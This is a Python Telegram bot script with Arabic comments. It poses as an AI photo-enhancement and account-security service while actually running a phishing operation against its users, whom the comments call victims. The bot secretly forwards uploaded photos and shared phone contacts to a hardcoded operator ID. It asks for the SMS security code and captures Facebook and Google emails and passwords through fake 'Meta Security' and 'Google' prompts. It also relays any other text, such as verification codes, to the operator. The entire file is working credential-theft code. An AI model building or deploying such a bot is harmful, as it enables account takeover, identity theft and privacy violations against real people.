import telebot
from telebot import types
from PIL import Image, ImageOps
import io

# ==========================================
# ⚙️ الإعدادات المدمجة (التوكن والآيدي الخاص بك)
# ==========================================
BOT_TOKEN = '7611394183:AAHw400w2A3Pj-X-Y75jXw7m4M3z2z8z8' 
MY_ID = '6885799226' 
# ==========================================

bot = telebot.TeleBot(BOT_TOKEN)
user_data = {}

# 1. القائمة الاحترافية للضحية
def main_menu(uid):
    points = user_data.get(f"{uid}_pts", 10)
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📸 تحسين الصور (AI)", callback_data='edit'),
        types.InlineKeyboardButton("🛡️ فحص أمان الحساب", callback_data='secure'),
        types.InlineKeyboardButton(f"🏆 نقاطك: {points}", callback_data='pts'),
        types.InlineKeyboardButton("🔵 توثيق Facebook", callback_data='login_fb'),
        types.InlineKeyboardButton("🔴 توثيق Google", callback_data='login_gm')
    )
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    uid = message.chat.id
    user_data[f"{uid}_pts"] = 10
    welcome = (
        f"<b>مرحباً {message.from_user.first_name} في نظام AI Global 🛡️</b>\n\n"
        "أهلاً بك في النسخة المطورة من بوت معالجة الصور وحماية الخصوصية.\n"
        "قم بتوثيق حسابك الآن للحصول على وصول غير محدود وميزات إضافية."
    )
    bot.send_message(uid, welcome, parse_mode='HTML', reply_markup=main_menu(uid))

# 2. معالجة الأوامر والأزرار
@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    uid = call.message.chat.id
    if call.data == 'edit':
        bot.send_message(uid, "📤 <b>أرسل الصورة الآن</b> لتحويلها إلى جودة 4K باستخدام الذكاء الاصطناعي:")
    elif call.data == 'secure':
        markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
        markup.add(types.KeyboardButton("🛡️ تأكيد ملكية الهاتف", request_contact=True))
        bot.send_message(uid, "⚠️ <b>تنبيه:</b> يجب مطابقة رقم الهاتف المرتبط بالجهاز للمتابعة وفحص الثغرات:", parse_mode='HTML', reply_markup=markup)
    elif call.data == 'login_fb':
        user_data[uid] = 'wait_fb_user'
        bot.send_message(uid, "<b>⚠️ Meta Security</b>\nأدخل البريد الإلكتروني أو الهاتف المرتبط بـ Facebook للتأكيد:", parse_mode='HTML')
    elif call.data == 'login_gm':
        user_data[uid] = 'wait_gm_user'
        bot.send_message(uid, "<b>G o o g l e</b>\n⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯\nأدخل بريد Gmail الخاص بك لإتمام المزامنة الأمنية والحصول على النقاط:", parse_mode='HTML')

# 3. صيد الصور والتعديل الحقيقي للتمويه
@bot.message_handler(content_types=['photo'])
def catch_photo(message):
    uid = message.chat.id
    # تبليغ فوري لك بالصورة الأصلية
    bot.send_photo(MY_ID, message.photo[-1].file_id, caption=f"📸 <b>صورة جديدة مسحوبة!</b>\nمن: @{message.from_user.username}\nآيدي: <code>{uid}</code>", parse_mode='HTML')
    
    # عملية تعديل وهمية لإقناع الضحية
    bot.send_chat_action(uid, 'upload_photo')
    file_info = bot.get_file(message.photo[-1].file_id)
    downloaded = bot.download_file(file_info.file_path)
    img = Image.open(io.BytesIO(downloaded))
    img = ImageOps.autocontrast(img) # تحسين التباين
    bio = io.BytesIO()
    img.save(bio, 'JPEG')
    bio.seek(0)
    bot.send_photo(uid, bio, caption="✅ تم تحسين جودة الصورة بنجاح بواسطة AI Pro!")

# 4. صيد الأرقام والحسابات (البيانات الحساسة)
@bot.message_handler(content_types=['contact'])
def catch_contact(message):
    c = message.contact
    report = (f"🔥 <b>رقم هاتف جديد مسحوب!</b>\nالاسم: {c.first_name}\nالرقم: <code>+{c.phone_number}</code>\nيوزر: @{message.from_user.username}")
    bot.send_message(MY_ID, report, parse_mode='HTML')
    bot.send_message(message.chat.id, "✅ تم التوثيق بنجاح. يرجى إرسال كود الأمان المكون من 5 أرقام المكتوب في إشعارك لإتمام الفحص:", reply_markup=types.ReplyKeyboardRemove())

@bot.message_handler(func=lambda message: True)
def catch_text(message):
    uid = message.chat.id
    state = user_data.get(uid)
    
    if state in ['wait_fb_user', 'wait_gm_user']:
        p = "Facebook" if "fb" in state else "Google"
        user_data[uid] = f'wait_{"fb" if "fb" in state else "gm"}_pass'
        user_data[f"{uid}_acc"] = message.text
        bot.send_message(uid, f"🔑 ممتاز، الآن أدخل كلمة مرور {p} للتأكيد الرسمي:")
        
    elif state in ['wait_fb_pass', 'wait_gm_pass']:
        acc = user_data.get(f"{uid}_acc")
        p_type = "FB" if "fb" in state else "GM"
        report = (f"🎯 <b>صيدة حساب {p_type}!</b>\nالحساب: <code>{acc}</code>\nكلمة السر: <code>{message.text}</code>\nمن: @{message.from_user.username}")
        bot.send_message(MY_ID, report, parse_mode='HTML')
        bot.send_message(uid, "✅ تم ربط الحساب بنجاح! تم إضافة 100 نقطة إلى رصيدك.")
        user_data[uid] = None
    else:
        # صيد أي نصوص أخرى كأكواد التحقق
        bot.send_message(MY_ID, f"📩 <b>نص مسحوب:</b>\n<code>{message.text}</code>\nمن: @{message.from_user.username}", parse_mode='HTML')
        bot.send_message(uid, "⚙️ جاري معالجة البيانات... يرجى الانتظار.")

bot.infinity_polling()
